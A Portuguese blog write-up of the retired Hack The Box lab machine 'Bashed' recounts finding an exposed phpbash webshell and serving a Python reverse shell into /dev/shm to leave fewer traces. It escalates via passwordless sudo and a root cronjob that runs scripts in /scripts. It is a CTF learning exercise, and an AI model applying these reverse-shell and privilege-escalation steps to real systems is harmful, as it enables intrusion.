---
layout: post
title: Bashed [Hack The Box] Write-up
date: 2018-04-28 20:50
author: brennords
comments: true
categories: [CTFs, Hack the box, Hacking?, Reverse/Xpl/Bin, Web/Net, write-ups]
---
<p style="text-align:justify;">O <a href="https://www.hackthebox.eu/" target="_blank" rel="noopener">Hack The Box</a> é "uma plataforma online que permite você testar e avançar com suas habilidades em cybersegurança". O Hack The Box nos dá acesso ao site onde, além de uns desafios clássicos de CTF (web, misc, rev...), há também servidores reais configurados para serem ownados. Esta segunda parte funciona com um acesso via VPN que é oferecido depois de você ter hackeado o sistema de convite e criado uma conta. O serviço é de graça, mas uns planos pagos são oferecidos. Se não conhecia e ficou curioso, dá uma olhada no site. Tem todo um ranking, sistema de níveis e outras putarias.</p>

&nbsp;

<p style="text-align:justify;">Agora, vamos a parte que interessa.</p>

<p style="text-align:justify;"><a href="https://www.hackthebox.eu/home/machines/profile/118" target="_blank" rel="noopener">Bashed</a> é uma máquina que foi aposentada agora, dia 28/04/2018. É por isso que posso publicar um write-up, pois a comunidade ao redor do hack the box respeita a ideia de apenas publicar soluções de desafios que já não pontuam para o ranking.</p>

<p style="text-align:justify;">Entre as ativas, ela era uma das mais fáceis.</p>

<img class="alignnone size-full wp-image-1616" src="https://brenn0.files.wordpress.com/2018/04/bashed_ranking.png" alt="bashed_ranking" width="560" height="80" />

<p style="text-align:justify;">O processo de hackear uma máquina, normalmente, segue o mesmo padrão:</p>

<ol>
    <li style="text-align:justify;">Reconhecimento (portas abertas, serviços rodando, tecnologias utilizadas nos serviços...);</li>
    <li style="text-align:justify;">Análise do que foi obtido no reconhecimento (que versões os serviços utilizam, como estão configurados...);</li>
    <li style="text-align:justify;">Uusar o que foi descoberto para buscar alguma brecha;</li>
    <li style="text-align:justify;">explorar a brecha para ter acesso ao sistema (explorar versões desatualizadas, má configurações...)</li>
    <li style="text-align:justify;">fazer o reconhecimento do sistema em busca de algo que leve ao acesso root (versões de serviços, configurações, blablabla...);</li>
    <li style="text-align:justify;">profit.</li>
</ol>

<p style="text-align:justify;">Mas nunca há realmente um "padrão". Eu uso esse processo como uma base frágil para tentar não deixar passar nada em branco. Há várias possibilidades que só vão depender das particularidades do sistema.</p>

<p style="text-align:justify;">Então, comecei com um clássico scanner de portas usando o NMAP:</p>

https://gist.github.com/brerodrigues/90e91e1ad2f696b5b058f30005b1a540

<p style="text-align:justify;">Aparantemente o servidor só estava com a porta 80 aberta e rodando um servidor http apache. O passo seguinte foi acessar o site e analisa-lo.</p>

<img class="alignnone size-full wp-image-1609" src="https://brenn0.files.wordpress.com/2018/04/web_initial.png" alt="web_initial" width="897" height="609" />

<p style="text-align:justify;">O site rodando é simples e não oferecia nada além de páginas estáticas. No código fonte não havia nada interessante.</p>

<p style="text-align:justify;">Mas na página http://10.10.10.68/<strong>single.html </strong>teve algo que chamou minha atenção: Arrexel's, o dono do site, fala sobre o <a href="https://github.com/Arrexel/phpbash" target="_blank" rel="noopener">phpbash</a> e que a desenvolveu neste mesmo servidor. Ou seja, havia uma webshell em algum canto do server e seria ótimo encontrar.</p>

<p style="text-align:justify;">Abaixo do curto texto há prints de tela com o phpbash rodando. Achei que seria uma dica e tentei acessar o phpbash usando o caminho /uploads/phpbash.php, que é exibido em um dos prints, mas sem sucesso.</p>

<p style="text-align:justify;">Foi hora de partir para ignorância: fazer força-bruta dos diretórios do servior web, o que é bem comum em muitas máquinas do hackthebox. Gosto de usar o <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project" target="_blank" rel="noopener">OWASP DirBuster</a> por nenhuma razão em especial. E usei <a href="https://github.com/thesp0nge/enchant/blob/master/db/directory-list-2.3-medium.txt" target="_blank" rel="noopener">esta</a> wordlist.</p>

<img class=" size-full wp-image-1610 aligncenter" src="https://brenn0.files.wordpress.com/2018/04/dir_buster1.png" alt="dir_buster1" width="771" height="547" />

Depois de uns minutos, encontrei exatamente o que esperava:

<img class=" size-full wp-image-1611 aligncenter" src="https://brenn0.files.wordpress.com/2018/04/dev_folder.png" alt="dev_folder" width="447" height="280" />

<p style="text-align:justify;">Assim que tive acesso a webshell, fui em busca da flag do usuário. Ela sempre estará em /home dentro do diretório de alguém. Nesse caso, era o arrexel.</p>

<img class=" size-full wp-image-1612 aligncenter" src="https://brenn0.files.wordpress.com/2018/04/user_flag.png" alt="user_flag" width="589" height="377" />

<p style="text-align:justify;">Agora era preciso virar root e para isso uma webshell não é legal. Costumo usar essas <a href="https://github.com/infodox/python-pty-shells" target="_blank" rel="noopener">shells em python</a> porque já pego um pseudo terminal.</p>

<p style="text-align:justify;">Preparei meu pc para receber a shell:</p>

[code]brenno@budweiser ~/D/p/e/python-shells&gt; python shell_handler.py 10.10.15.111:1338 -b[/]
[/code]

<p style="text-align:justify;">E, depois de ter alterado o arquivo back_connect.py e inserido meu endereço ip e porta para onde a shell reversa seria enviada, preparei um simples servidor http para enviar a shell.</p>

[code]brenno@budweiser ~/D/p/e/python-shells&gt; python -m SimpleHTTPServer 8000 Serving HTTP on 0.0.0.0 port 8000 ...[/code]

<p style="text-align:justify;">Na webshell, entrei no diretório <a href="https://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html" target="_blank" rel="noopener">/dev/shm</a>, que é um diretório que usa a memória RAM para armazenar os dados, assim podemos deixar menos evidências no servidor ownado. Boas práticas na simulação leva a boas práticas na prática. Aí foi só mandar um wget para buscar a shell reversa.</p>

<img class=" size-full wp-image-1613 aligncenter" src="https://brenn0.files.wordpress.com/2018/04/get_to_dev_shm_back_connect.png" alt="get_to_dev_shm_back_connect" width="654" height="212" />

<p style="text-align:justify;">Aí foi só rodar meu script com o comando <em>python back_connect.py</em> e voltar ao meu terminal para ver isso aqui:</p>

<img class="alignnone size-full wp-image-1614" src="https://brenn0.files.wordpress.com/2018/04/got_a_shell.png" alt="got_a_shell" width="777" height="44" />

<p style="text-align:justify;">Temos uma bela shell!</p>

<p style="text-align:justify;">Só pelo hábito, assim que peguei a shell, usei o comando <em>sudo -l</em> para ver se o usuário www-data tinha alguns privilégios:</p>

[code]www-data@bashed:/dev/shm$ sudo -l
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/dev/shm$[/code]

Olha só, podemos executar qualquer coisa como scriptmanager sem precisar usar senha.

[code]www-data@bashed:/dev/shm$ sudo -u scriptmanager bash
scriptmanager@bashed:/dev/shm$[/code]

<p style="text-align:justify;">Virei scriptmanager. Soa melhor que <a href="https://askubuntu.com/questions/873839/what-is-the-www-data-user" target="_blank" rel="noopener">www-data</a>. E, como um usuário de verdade (sei disso porque lembrei de ter visto uma pasta para ele em /home), provavelmente tem mais privilégios.</p>

<p style="text-align:justify;">Foi aí que comecei a fuçar no servidor, vendo que serviços rodavam, se havia algum vulnerável, versão do kernel e <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">o que era mais padrão para escalar privilégios</a>. Foi em meio a esse processo de reconhecimento que percebi algo fora do normal no diretório raiz: a pasta <em>scripts</em>.</p>

[code]scriptmanager@bashed:/$ ls -alh
total 88K
drwxr-xr-x 23 root root 4.0K Dec 4 13:02 .
drwxr-xr-x 23 root root 4.0K Dec 4 13:02 ..
drwxr-xr-x 2 root root 4.0K Dec 4 11:22 bin
drwxr-xr-x 3 root root 4.0K Dec 4 11:17 boot
drwxr-xr-x 19 root root 4.2K Feb 25 10:28 dev
drwxr-xr-x 89 root root 4.0K Dec 4 17:09 etc
drwxr-xr-x 4 root root 4.0K Dec 4 13:53 home
lrwxrwxrwx 1 root root 32 Dec 4 11:14 initrd.img -&gt; boot/initrd.img-4.4.0-62-generic
drwxr-xr-x 19 root root 4.0K Dec 4 11:16 lib
drwxr-xr-x 2 root root 4.0K Dec 4 11:13 lib64
drwx------ 2 root root 16K Dec 4 11:13 lost+found
drwxr-xr-x 4 root root 4.0K Dec 4 11:13 media
drwxr-xr-x 2 root root 4.0K Feb 15 2017 mnt
drwxr-xr-x 2 root root 4.0K Dec 4 11:18 opt
dr-xr-xr-x 359 root root 0 Feb 25 10:28 proc
drwx------ 3 root root 4.0K Dec 4 13:03 root
drwxr-xr-x 18 root root 500 Feb 25 10:28 run
drwxr-xr-x 2 root root 4.0K Dec 4 11:18 sbin
drwxrwxr-- 2 scriptmanager scriptmanager 4.0K Feb 25 13:45 scripts
drwxr-xr-x 2 root root 4.0K Feb 15 2017 srv
dr-xr-xr-x 13 root root 0 Feb 25 10:33 sys
drwxrwxrwt 14 root root 4.0K Feb 25 13:51 tmp
drwxr-xr-x 10 root root 4.0K Dec 4 11:13 usr
drwxr-xr-x 12 root root 4.0K Dec 4 11:20 var
lrwxrwxrwx 1 root root 29 Dec 4 11:14 vmlinuz -&gt; boot/vmlinuz-4.4.0-62-generic[/code]

E o que encontrei dentro desse diretório me fez suspeitar que estava no caminho certo:

[code]scriptmanager@bashed:/scripts$ ls -l
total 16
-rw-r--r-- 1 scriptmanager scriptmanager 46 Feb 25 13:53 test.py
-rw-r--r-- 1 root root 12 Feb 25 11:03 test.txt[/code]

Ao verificar o conteúdo dos dois arquivos obtive:

[code]scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing!")
scriptmanager@bashed:/scripts$ cat test.txt
testing!scriptmanager@bashed:/scripts$[/code]

<p style="text-align:justify;">De alguma forma o script python test.py era executado como root, abria o arquivo test.txt e escrevia a palavra "<em>testing!</em>". Essa porra parecia promissora. Então coloquei um shell handler para esperar uma conexão em outra porta no meu computador, substitui o arquivo test.py pelo meu script de shell reversa e esperei.</p>

<img class="alignnone size-full wp-image-1615" src="https://brenn0.files.wordpress.com/2018/04/got_root.png" alt="got_root" width="769" height="38" />

Acesso root obtido com sucesso. Agora era só pegar a flag:

[code]

root@bashed:/scripts# cat /root/root.txt
cc4f0afe3a1026d402ba10329674a8e2

[/code]

E confirmar uma suspeita que tive:

[code]

root@bashed:/scripts# crontab -l
* * * * * cd /scripts; for f in *.py; do python "$f"; done
root@bashed:/scripts#[/code]

<p style="text-align:justify;">Aparentemente havia um <a href="http://blog.thiagobelem.net/o-que-sao-e-como-usar-as-cron-jobs" target="_blank" rel="noopener">cronjob</a> do usuário root responsável por executar qualquer script terminado em .py que estivesse na pasta /scripts. Nem era preciso substituir o test.py como fiz.</p>

<p style="text-align:justify;">Depois disso dei um reset na máquina para garantir que ninguém encontrasse meus arquivos e perdesse a diversão de descobrir o caminho sozinho e parti para a próxima.</p>
